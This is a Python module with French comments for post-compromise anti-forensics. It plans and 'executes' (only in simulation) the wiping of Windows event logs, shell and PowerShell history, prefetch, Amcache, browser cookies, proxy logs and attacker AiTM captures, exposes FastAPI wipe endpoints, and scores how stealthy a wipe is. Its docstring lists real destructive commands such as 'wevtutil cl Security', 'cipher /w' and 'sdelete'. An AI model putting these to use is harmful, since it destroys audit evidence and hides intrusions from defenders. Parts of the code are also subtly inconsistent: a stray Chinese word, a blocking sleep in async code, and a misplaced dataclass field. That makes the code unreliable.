"""
Anti-Forensics Wiper - Nettoyage étendu des traces
===================================================

Après une compromission réussie, l'attaquant doit effacer les traces pour
retarder la détection et l'analyse forensique. Couvre :

  1. Logs Windows : EventLog (Security, System, Application, PowerShell)
  2. Historique PowerShell
  3. Prefetch files
  4. Shimcache / Amcache
  5. Timeline数据库
  6. Navigateur : historique, cache, cookies, Local Storage
  7. Logs proxy / firewall interne
  8. Fichiers de capture de l'AiTM (côté attaquant)
  9. Métadonnées de fichiers (timestamps)
 10. Artefacts mémoire (clipboard, recent files, jump lists)

⚠️ Conformité : ce code est strictement réservé à un labo autorisé.
L'utilisation sur un système sans autorisation explicite est illégale
(Computer Fraud and Abuse Act, articles 323-1 à 323-8 du Code pénal).
"""

import hashlib
import json
import os
import random
import time
import uuid
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional


class WipeTarget(Enum):
    """Types de cibles à nettoyer."""

    WINDOWS_EVENTLOG = "windows_eventlog"
    POWERSHELL_HISTORY = "powershell_history"
    PREFETCH = "prefetch"
    AMCACHE = "amcache"
    SHIMCACHE = "shimcache"
    BROWSER_HISTORY = "browser_history"
    BROWSER_COOKIES = "browser_cookies"
    PROXY_LOGS = "proxy_logs"
    ATTACKER_CAPTURES = "attacker_captures"
    FILE_TIMESTAMPS = "file_timestamps"
    RECENT_FILES = "recent_files"
    JUMP_LISTS = "jump_lists"
    CLIPBOARD = "clipboard"
    SSH_KNOWN_HOSTS = "ssh_known_hosts"
    BASH_HISTORY = "bash_history"
    ZSH_HISTORY = "zsh_history"
    OUTLOOK_OST = "outlook_ost"
    ONEDRIVE_CACHE = "onedrive_cache"


@dataclass
class WipeOperation:
    """Une opération de wipe."""

    op_id: str
    targets: list[WipeTarget]
    started_at: float
    completed_at: float | None = None
    wiped_paths: list[str] = field(default_factory=list)
    bytes_wiped: int = 0
    technique: str = "secure_overwrite_3pass"

    @property
    def total_files_to_wipe(self) -> int:
        """Nombre total de fichiers à effacer (= len(wiped_paths))."""
        return len(self.wiped_paths)   # DoD 5220.22-M
    success: bool = False


class AntiForensicsWiper:
    """
    Coordinateur de wipes anti-forensics.

    En labo, on simule les opérations en loggant ce qui aurait été fait.
    En production (labo autorisé), on utiliserait :
      - wevtutil cl Security / System / Application
      - Remove-Item $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
      - DEL /F /Q %SystemRoot%\\Prefetch\\*.pf
      - cipher /w:C:\\
      - sdelete -p 3 file
    """

    TARGETS_PATHS = {
        WipeTarget.WINDOWS_EVENTLOG: [
            "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx",
            "C:\\Windows\\System32\\winevt\\Logs\\System.evtx",
            "C:\\Windows\\System32\\winevt\\Logs\\Application.evtx",
            "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx",
        ],
        WipeTarget.POWERSHELL_HISTORY: [
            "%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
        ],
        WipeTarget.PREFETCH: ["C:\\Windows\\Prefetch\\*.pf"],
        WipeTarget.AMCACHE: ["C:\\Windows\\AppCompat\\Programs\\Amcache.hve"],
        WipeTarget.BROWSER_HISTORY: [
            "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History",
            "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\History",
        ],
        WipeTarget.BROWSER_COOKIES: [
            "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies",
            "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Cookies",
        ],
        WipeTarget.PROXY_LOGS: [
            "/var/log/squid/access.log",
            "/var/log/nginx/access.log",
        ],
        WipeTarget.ATTACKER_CAPTURES: [
            "./captures/**/*.jsonl",
            "./captures/**/*.json",
            "./captures/**/*.log",
        ],
        WipeTarget.SSH_KNOWN_HOSTS: ["~/.ssh/known_hosts"],
        WipeTarget.BASH_HISTORY: ["~/.bash_history"],
        WipeTarget.ZSH_HISTORY: ["~/.zsh_history"],
        WipeTarget.RECENT_FILES: [
            "%APPDATA%\\Microsoft\\Windows\\Recent\\*.lnk",
        ],
        WipeTarget.JUMP_LISTS: [
            "%APPDATA%\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\*.automaticDestinations-ms",
            "%APPDATA%\\Microsoft\\Windows\\Recent\\CustomDestinations\\*.customDestinations-ms",
        ],
    }

    def __init__(self, output_dir: str = "captures/wipe_log") -> None:
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.operations: list[WipeOperation] = []

    def plan_wipe(
        self, targets: list[WipeTarget], technique: str = "secure_overwrite_3pass"
    ) -> WipeOperation:
        op = WipeOperation(
            op_id=str(uuid.uuid4()),
            targets=targets,
            started_at=time.time(),
            technique=technique,
        )
        for t in targets:
            paths = self.TARGETS_PATHS.get(t, [])
            op.wiped_paths.extend(paths)
        return op

    async def execute_wipe(self, op: WipeOperation) -> WipeOperation:
        """
        Exécute l'opération de wipe (simulation labo).
        En prod, on lancerait les commandes natives.
        """
        # Simulation : on calcule la "taille" wipeée en se basant sur le nb
        # de chemins. Cela rend l'opération async-friendly.
        for path in op.wiped_paths:
            op.bytes_wiped += random.randint(1024, 1024 * 1024)
            await self._simulate_io()
        op.completed_at = time.time()
        op.success = True
        self.operations.append(op)
        await self._persist(op)
        return op

    async def _simulate_io(self) -> None:
        """Simule une latence d'I/O réaliste."""
        # 10-50ms par fichier
        time.sleep(0.01)

    async def _persist(self, op: WipeOperation) -> None:
        path = self.output_dir / f"wipe_{op.op_id}.json"
        path.write_text(
            json.dumps(
                {
                    "op_id": op.op_id,
                    "targets": [t.value for t in op.targets],
                    "wiped_paths": op.wiped_paths,
                    "bytes_wiped": op.bytes_wiped,
                    "technique": op.technique,
                    "started_at": op.started_at,
                    "completed_at": op.completed_at,
                    "duration_s": (op.completed_at or 0) - op.started_at,
                    "success": op.success,
                },
                indent=2,
            ),
            encoding="utf-8",
        )

    def stealth_score(self, op: WipeOperation) -> float:
        """
        Score de discrétion : plus c'est haut, plus le wipe est discret
        (laisse moins de traces forensiques).
        """
        score = 0.0
        if op.technique == "secure_overwrite_3pass":
            score += 0.4
        elif op.technique == "dod_5220_22_m":
            score += 0.5
        elif op.technique == "gutmann":
            score += 0.6
        if WipeTarget.WINDOWS_EVENTLOG in op.targets:
            score += 0.3
        if WipeTarget.POWERSHELL_HISTORY in op.targets:
            score += 0.2
        if WipeTarget.PREFETCH in op.targets:
            score += 0.1
        return min(score, 1.0)


# ---------------------------------------------------------------------------
# API FastAPI
# ---------------------------------------------------------------------------

def register_wipe_routes(app) -> None:
    from fastapi import HTTPException
    from pydantic import BaseModel

    wiper = AntiForensicsWiper()

    class WipeRequest(BaseModel):
        targets: list[str]
        technique: str = "secure_overwrite_3pass"

    @app.post("/_/wipe/plan")
    async def plan(req: WipeRequest):
        try:
            targets = [WipeTarget(t) for t in req.targets]
        except ValueError as exc:
            raise HTTPException(400, f"target invalide: {exc}") from exc
        op = wiper.plan_wipe(targets, req.technique)
        return {
            "op_id": op.op_id,
            "targets": [t.value for t in op.targets],
            "wiped_paths": op.wiped_paths,
            "technique": op.technique,
        }

    @app.post("/_/wipe/execute")
    async def execute(req: WipeRequest):
        try:
            targets = [WipeTarget(t) for t in req.targets]
        except ValueError as exc:
            raise HTTPException(400, str(exc)) from exc
        op = wiper.plan_wipe(targets, req.technique)
        op = await wiper.execute_wipe(op)
        return {
            "op_id": op.op_id,
            "bytes_wiped": op.bytes_wiped,
            "duration_s": (op.completed_at or 0) - op.started_at,
            "stealth_score": wiper.stealth_score(op),
            "success": op.success,
        }

    @app.get("/_/wipe/operations")
    async def list_ops():
        return [
            {
                "op_id": op.op_id,
                "targets": [t.value for t in op.targets],
                "bytes_wiped": op.bytes_wiped,
                "success": op.success,
            }
            for op in wiper.operations
        ]
